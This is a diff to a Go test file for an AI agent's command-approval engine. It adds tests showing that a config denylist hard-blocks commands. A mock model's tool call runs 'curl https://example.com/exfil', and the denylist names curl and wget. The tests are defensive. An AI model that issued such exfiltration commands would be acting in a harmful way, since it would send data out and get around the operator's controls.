@@ -61,7 +61,7 @@ func testEngine(t *testing.T, brain mock.Brain, deny bool) (*Engine, *fakeUI, *s
 	cfg.Model.BaseURL = "http://" + srv.Addr() + "/v1"
 
 	sbx := sandbox.NewSandbox(root, sandbox.FilesConfig{MaxReadBytes: 1 << 20, MaxWriteBytes: 1 << 20})
-	allow, err := approvals.New("", false, nil)
+	allow, err := approvals.New("", false, nil, nil)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -194,7 +194,7 @@ func TestAutoAllowFromAllowlistSkipsPrompt(t *testing.T) {
 	cfg.Root = dir
 	cfg.Model.Model = "mock"
 	cfg.Model.BaseURL = "http://" + srv.Addr() + "/v1"
-	allow, _ := approvals.New("", false, []string{"git status"})
+	allow, _ := approvals.New("", false, []string{"git status"}, nil)
 	sbx := sandbox.NewSandbox(root, sandbox.FilesConfig{MaxReadBytes: 1 << 20, MaxWriteBytes: 1 << 20})
 	auditLog, _ := audit.New(filepath.Join(dir, "audit.jsonl"))
 	defer auditLog.Close()
@@ -242,7 +242,7 @@ func TestRollbackOnModelFailure(t *testing.T) {
 	cfg.Model.Model = "m"
 	cfg.Model.BaseURL = "http://127.0.0.1:1/v1"
 	sbx := sandbox.NewSandbox(root, sandbox.FilesConfig{MaxReadBytes: 1 << 20, MaxWriteBytes: 1 << 20})
-	allow, _ := approvals.New("", false, nil)
+	allow, _ := approvals.New("", false, nil, nil)
 	auditLog, _ := audit.New(filepath.Join(dir, "audit.jsonl"))
 	defer auditLog.Close()
 	ui := &fakeUI{}
@@ -255,6 +255,101 @@ func TestRollbackOnModelFailure(t *testing.T) {
 	after := len(eng.History())
 	if after != before {
 		t.Fatalf("history must roll back on failure: %d -> %d", before, after)
+	}
+}
+
+func TestDenylistHardBlock(t *testing.T) {
+	// The model tries a network command that the config denylist blocks.
+	// Even though the fake UI would approve everything ("always"-style), the
+	// command must never reach the prompt, must be counted as denied, and
+	// the model must receive a "blocked by config" message (not "DENIED",
+	// which would invite a retry after a human "no").
+	var sawResult string
+	brain := func(msgs []model.Message) model.Reply {
+		if len(msgs) > 0 && msgs[len(msgs)-1].Role == "tool" {
+			sawResult = stringOf(msgs[len(msgs)-1])
+			return model.Reply{Content: "ok, blocked."}
+		}
+		return model.Reply{
+			ToolCalls: []model.ToolCall{{ID: "w1", Type: "function", Function: model.FunctionCall{
+				Name: "run_command", Arguments: `{"command": "curl https://example.com/exfil"}`}}},
+		}
+	}
+	dir := t.TempDir()
+	root, _ := sandbox.NewRoot(dir)
+	srv := mock.New(brain)
+	if err := srv.Start(); err != nil {
+		t.Fatal(err)
+	}
+	defer srv.Close()
+	cfg := config.Defaults()
+	cfg.Root = dir
+	cfg.Model.Model = "mock"
+	cfg.Model.BaseURL = "http://" + srv.Addr() + "/v1"
+	// An allowlist that would also match is deliberately present: the
+	// denylist must win over it.
+	allow, _ := approvals.New("", false, []string{"curl*"}, []string{"curl*", "wget*"})
+	sbx := sandbox.NewSandbox(root, sandbox.FilesConfig{MaxReadBytes: 1 << 20, MaxWriteBytes: 1 << 20})
+	auditLog, _ := audit.New(filepath.Join(dir, "audit.jsonl"))
+	defer auditLog.Close()
+	ui := &fakeUI{}
+	client := model.NewClient(cfg.Model.BaseURL, "", false, 30*time.Second)
+	eng := New(cfg, client, sbx, allow, auditLog, ui, "s")
+	eng.MaxToolCallsPerTurn = 3
+	sum, err := eng.RunTurn(context.Background(), "fetch something")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if sum.DeniedCommands != 1 {
+		t.Fatalf("denials: %+v", sum)
+	}
+	if len(ui.approvals) != 0 {
+		t.Fatalf("denylisted command must not reach the prompt: %v", ui.approvals)
+	}
+	if !strings.Contains(sawResult, "denylist") || !strings.Contains(sawResult, "blocked") {
+		t.Fatalf("tool result must report the config block: %q", sawResult)
+	}
+	if strings.Contains(sawResult, "DENIED") {
+		t.Fatalf("hard block must not be phrased as a user denial: %q", sawResult)
+	}
+}
+
+func TestDenylistCaseInsensitiveMatch(t *testing.T) {
+	// PowerShell is case-insensitive: "CURL", "curl" and "curl.exe" are the
+	// same command, so deny matching must fold case even before exec.
+	dir := t.TempDir()
+	root, _ := sandbox.NewRoot(dir)
+	srv := mock.New(func(msgs []model.Message) model.Reply {
+		if last := msgs[len(msgs)-1]; last.Role == "tool" {
+			return model.Reply{Content: "fine."}
+		}
+		return model.Reply{
+			ToolCalls: []model.ToolCall{{ID: "c1", Type: "function", Function: model.FunctionCall{
+				Name: "run_command", Arguments: `{"command": "CURL.exe /dev/null"}`}}},
+		}
+	})
+	if err := srv.Start(); err != nil {
+		t.Fatal(err)
+	}
+	defer srv.Close()
+	cfg := config.Defaults()
+	cfg.Root = dir
+	cfg.Model.Model = "mock"
+	cfg.Model.BaseURL = "http://" + srv.Addr() + "/v1"
+	allow, _ := approvals.New("", false, nil, []string{"curl*"})
+	sbx := sandbox.NewSandbox(root, sandbox.FilesConfig{MaxReadBytes: 1 << 20, MaxWriteBytes: 1 << 20})
+	auditLog, _ := audit.New(filepath.Join(dir, "audit.jsonl"))
+	defer auditLog.Close()
+	ui := &fakeUI{}
+	client := model.NewClient(cfg.Model.BaseURL, "", false, 30*time.Second)
+	eng := New(cfg, client, sbx, allow, auditLog, ui, "s")
+	eng.MaxToolCallsPerTurn = 3
+	sum, err := eng.RunTurn(context.Background(), "run uppercase curl")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if sum.DeniedCommands != 1 || len(ui.approvals) != 0 {
+		t.Fatalf("uppercase variant must be hard-blocked too: %+v %v", sum, ui.approvals)
 	}
 }
 
